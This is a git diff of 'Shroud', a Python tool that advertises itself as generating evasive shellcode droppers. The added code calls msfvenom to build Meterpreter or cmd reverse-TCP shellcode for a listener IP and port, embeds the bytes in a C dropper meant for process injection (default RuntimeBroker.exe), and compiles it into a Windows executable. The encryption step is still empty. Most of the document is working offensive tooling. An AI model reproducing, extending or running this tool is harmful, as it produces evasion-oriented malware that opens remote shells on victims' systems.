@@ -1,56 +1,129 @@
 #!/usr/bin/python3
 import argparse
 import subprocess
+import os
 
 print("""
-                                             .::
-       .::                                   .::                                                                                                                                                                                 
- .:::: .::     .: .:::   .::    .::  .::     .::                                                                                                                                                                                 
-.::    .: .:    .::    .::  .:: .::  .:: .:: .::                                                                                                                                                                                 
-  .::: .::  .:: .::   .::    .::.::  .::.:   .::                                                                                                                                                                                 
-    .::.:   .:: .::    .::  .:: .::  .::.:   .::                                                                                                                                                                                 
-.:: .::.::  .::.:::      .::      .::.:: .:: .::
-                  
-				  by twopoint
+.▄▄ ·  ▄ .▄▄▄▄        ▄• ▄▌·▄▄▄▄  
+▐█ ▀. ██▪▐█▀▄ █· ▄█▀▄ █▪██▌██· ██ 
+▄▀▀▀█▄██▀▀█▐▀▀▄ ▐█▌.▐▌█▌▐█▌▐█▪ ▐█▌
+▐█▄▪▐███▌▐▀▐█•█▌▐█▌.▐▌▐█▄█▌██. ██ 
+ ▀▀▀▀ ▀▀▀ ·.▀  ▀ ▀█▄▀▪ ▀▀▀ ▀▀▀▀▀•                                          
+                                                
+			by twopoint
 				  """)
 parser = argparse.ArgumentParser(
-                    prog='Shroud 0.1',
+                    prog='Shroud',
                     description='Generate evasive shellcode droppers.',
                     epilog='https://github.com/Jake123otte1/Shroud')
-parser.add_argument('--input', help='Input custom shellcode file')
+
+inputgroup = parser.add_argument_group('shellcode')
+inputgroup = inputgroup.add_mutually_exclusive_group(required=True)
+inputgroup.add_argument('--file', help='Custom shellcode file')
+inputgroup.add_argument('--msf', help='Generate a Meterpreter template payload.', action="store_true")
+inputgroup.add_argument('--shell', help='Generate a reverse shell (cmd) template payload.',  action="store_true")
 parser.add_argument('output', help='Output dropper file. Specify .exe or .dll.')
-parser.add_argument('-M', help='Generate a Meterpreter template payload.', action="store_true")
-parser.add_argument('-S', help='Generate a reverse shell (cmd) template payload.',  action="store_true")
 parser.add_argument('-L', '--lhost', help='Listener IP for templates.')
 parser.add_argument('-P', '--lport', help='Listener port for templates.')
 parser.add_argument('--export', help='Exported function name for DLL.')
-parser.add_argument('--process', help='Target process name for creation or remote injection. Default is notepad.exe.')
+parser.add_argument('--process', help='Target process name for creation or remote injection. Default is RuntimeBroker.exe.')
 parser.add_argument('--xor', help='Use XOR encryption. Default is AES-256.', action="store_true")
 parser.add_argument('--dont-encrypt', help='Don\'t encrypt the payload.', action="store_true")
 args = parser.parse_args()
 
 # Generate templates if specified
 def generateTemplate():
-	if args.M: # Meterpreter shell
+	if not args.lhost or not args.lport:
+		print("[-] Listener IP and port are required for templates.")
+		exit()
+	if args.msf: # Meterpreter shell
 		subprocess.run(["msfvenom","-p","windows/x64/meterpreter/reverse_tcp",f"LHOST={args.lhost}",f"LPORT={args.lport}","-f","raw","-o","./output/shellcode.raw"], stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
-	if args.S: # CMD shell
+	if args.shell: # CMD shell
 		subprocess.run(["msfvenom","-p","windows/x64/shell/reverse_tcp",f"LHOST={args.lhost}",f"LPORT={args.lport}","-f","raw","-o","./output/shellcode.raw"], stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
+	return
 
+# Compile to binary
+def compile():
+	if args.output.endswith(".exe"): # PE compilation
+		p = subprocess.run([f"x86_64-w64-mingw32-gcc -I/usr/share/mingw-w64/include ./src/* -o ./output/{args.output}"], shell=True, capture_output=True)
+		if "ld returned 1 exit status" in p.stderr.decode():
+			print("[-] Compilation failed.")
+			exit()
+		else:
+			print("[+] Compilation successful. Check output folder.")
+			exit()
+
+	if args.output.endswith(".dll"): # DLL compilation (TO-DO)
+		print("WIP1")
+	return
+
+def readShellcode(filePath):
+
+	shellcode = []
+
+	with open(filePath, "rb") as f:
+		byte = f.read(1)
+		while byte != b"":
+			shellcode.append(byte)
+			byte = f.read(1)
+
+	return shellcode
+
+def writePayload(shellcode):
+
+	# Read in current runner
+	mainFileR = open("./src/main.c", "r")
+	mainLines = mainFileR.readlines()
+	mainFileR.close()
+	
+	# Loop over lines and update payload / size
+	newLines = []
+	for line in mainLines:
+
+		# Update payload line
+		if "BYTE pPayload[]" in line:
+			
+			line = "\tBYTE pPayload[] = { "
+			for j in range(0,len(shellcode)):
+				if j != len(shellcode)-1:
+					line += f"0x{shellcode[j].hex()}, "
+				else:
+					line += f"0x{shellcode[j].hex()}" + " };\n"
+		
+		# Update size line
+		if "SIZE_T sPayloadSize" in line:
+
+			line = f"\tSIZE_T sPayloadSize = {len(shellcode)};\n"
+
+		newLines.append(line)
+
+	# Write to runner
+	with open("./src/main.c", mode="wt", encoding="utf-8") as mainFileW:
+		for line in newLines:
+			mainFileW.write(line)
+	
+	return
 
 def main():
 	# Generate templates if necessary
-	if args.M or args.S:
+	if args.msf or args.shell:
 		print(f"[~] Generating shellcode from template. (IP: {args.lhost}, PORT: {args.lport})")
 		generateTemplate()
+		shellcode = readShellcode("./output/shellcode.raw")
+	elif args.file:
+		print(f"[!] Using custom shellcode file {args.file}")
+		shellcode = readShellcode(args.file)
 
 	# Encrypt payload (check xor and don't-encrypt)
 	
 
 	# Update dropper file wrapper (update payload, process name, export)
+	print("[~] Writing payload to dropper...")
+	writePayload(shellcode)
 
-
-	# Compile
-	
+	# Compile (x86_64-w64-mingw32-gcc -I/usr/share/mingw-w64/include ./src/* -o ./output/shroud.exe)
+	print("[~] Compiling...")
+	compile()
 
 
 if __name__ == '__main__':
